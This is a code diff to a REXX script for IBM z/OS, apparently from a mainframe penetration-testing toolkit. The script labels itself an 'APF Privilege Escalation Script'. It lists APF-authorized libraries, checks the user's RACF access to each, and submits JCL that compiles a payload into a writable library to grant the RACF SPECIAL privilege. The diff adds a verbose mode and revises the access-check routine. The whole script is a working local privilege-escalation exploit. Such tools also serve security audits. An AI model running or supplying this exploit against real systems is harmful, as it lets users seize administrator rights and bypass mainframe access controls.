@@ -18,11 +18,22 @@
 /* Check out : http://zdevops.github.io/zdosu/                              */
 /****************************************************************************/
 
-parse arg dsn_input
+parse arg dsn_input verbose
+parse source . . prg . name . . space .
+
+say "+ APF Privilege Escalation Script"
+
+if verbose == 'verbose' then do 
+    verbose = 1
+    say '+ Verbose mode turned on'
+end
+else 
+    verbose = 0
 
 if dsn_input == "" then do
-    say "Usage: ex 'ELV.APF' 'list' to list apf libraries and their privileges"
-    say "       ex 'ELV.APF' 'APF_DSN' to have the SPECIAL privilege "
+    say "Usage: ex '"||name||"' 'list' to list apf libraries and their privileges"
+    say "       ex '"||name||"' 'APF_DSN' to have the SPECIAL privilege "
+    say "       ex '"||name||"' 'list verbose'"
     exit(-1)
 end
 
@@ -33,23 +44,23 @@ else do
     call listdsi "'"dsn_input"'"
     
     if sysdsorg <> "PO" then do
-        say "Cannot find APF Library '"dsn_input"', or not PDS"
+        say "! Cannot find APF Library '"dsn_input"', or not PDS"
         exit(-1)
     end    
     
     priv  =  check_priv(dsn_input)
     
     if (priv == "NONE") then do
-        say "Not enough privileges to alter APF library "dsn_input
+        say "! Not enough privileges to alter APF library "dsn_input
         exit(-1)
     end
     
     if (priv == "READ") then do
-        say "Not enough privileges to alter APF library "dsn_input
+        say "! Not enough privileges to alter APF library "dsn_input
         exit(-1)
     end
     if priv=="NO RACF PROFILE" then do
-        say "Warning: No RACF profile defined for "dsn_input", might not be uptable"
+        say "! Warning: No RACF profile defined for "dsn_input", might not be uptable"
     end
     
     launch_payload(dsn_input)
@@ -60,7 +71,7 @@ end
 launch_payload:
     APF_DSN = arg(1)   
     PROG = rand_char(6)    
-    say "Compiling " PROG "in" dsn_input
+    say "+ Compiling " PROG "in" dsn_input
     QUEUE "//ELVAPF  JOB (JOBNAME),'XSS',CLASS=A,NOTIFY=&SYSUID"
     QUEUE "//*"
     QUEUE "//BUILD   EXEC ASMACL"
@@ -151,12 +162,15 @@ list_apf:
       ALAST  = C2d(Storage(D2x(APFA + 12),4))    /* Last  entry          */
       LASTONE = 0   /* flag for end of list      */
       NUMAPF = 1    /* tot # of entries in list  */
-      say "APF_DSN, ACCESS"
+      say "+ Dataset --> Access"
       Do forever
          DSN.NUMAPF = Storage(D2x(AFIRST+24),44) /* DSN of APF library   */
          DSN.NUMAPF = Strip(DSN.NUMAPF,'T')      /* remove blanks        */
          PRIV.NUMAPF = check_priv(DSN.NUMAPF)
-         say DSN.NUMAPF ", " PRIV.NUMAPF
+         if verbose then
+            say "+" DSN.NUMAPF "-->" PRIV.NUMAPF
+         else if PRIV.NUMAPF == 'ALTER' then
+            say "+" DSN.NUMAPF "-->" PRIV.NUMAPF 
          CKSMS = Storage(D2x(AFIRST+4),1)        /* DSN of APF library   */
          if  bitand(CKSMS,'80'x)  = '80'x        /*  SMS data set?       */
            then VOL.NUMAPF = '*SMS* '            /* SMS control dsn      */
@@ -173,22 +187,38 @@ End
 exit(0)
 
 check_priv:
+  NOT_AUTH="NOT AUTHORIZED"
+  NO_PROFILE="NO RACF"
+  DSN = arg(1)
 
-NOT_AUTH="NOT AUTHORIZED"
-NO_PROFILE="NO RACF"
-
-DSN = arg(1)
-X = OUTTRAP('OUT.')
-ADDRESS TSO "LD DA('"DSN"') GEN"
-Y = OUTTRAP('OFF')
-IF OUT.0 == 1 & INDEX(OUT.1,NOT_AUTH)>0 THEN DO
-   return "NONE"
-END
-IF OUT.0 == 1 & INDEX(OUT.1,NO_PROFILE)>0 THEN DO
-   return "NO RACF PROFILE"
-END
-IF OUT.0>1 THEN DO
-   ACCESS = WORD(OUT.17,1)
-   return ACCESS
-END
+  /* First we Check for a specific rule */
+  /* ICH35003I */
+  A = OUTTRAP('OUT.')
+    ADDRESS TSO "LD DA('"DSN"')"
+  B = OUTTRAP('OFF')
+  IF OUT.0==1 THEN DO
+    IF INDEX(OUT.1,"ICH35003I") >0 THEN DO
+      X = OUTTRAP('OUTG.')
+        ADDRESS TSO "LD DA('"DSN"') GEN"
+      Y = OUTTRAP('OFF')
+      IF OUTG.0==1 THEN DO
+        IF INDEX(OUTG.1,NOT_AUTH)>0 THEN
+          RETURN "NONE"
+        IF INDEX(OUTG.1,NO_PROFILE)>0 THEN
+          RETURN "NO RACF PROFILE"
+      END
+      ELSE IF OUTG.0>1 THEN DO
+        ACCESS = WORD(OUTG.17,1)
+        return ACCESS
+      END
+    END
+    IF INDEX(OUT.1,NOT_AUTH)>0 THEN
+      RETURN "NONE"
+    IF INDEX(OUT.1,NO_PROFILE)>0 THEN
+      RETURN "NO RACF PROFILE"
+  END
+  ELSE IF OUT.0>1 THEN DO
+    ACCESS = WORD(OUT.17,1)
+    return ACCESS
+  END
 return -1
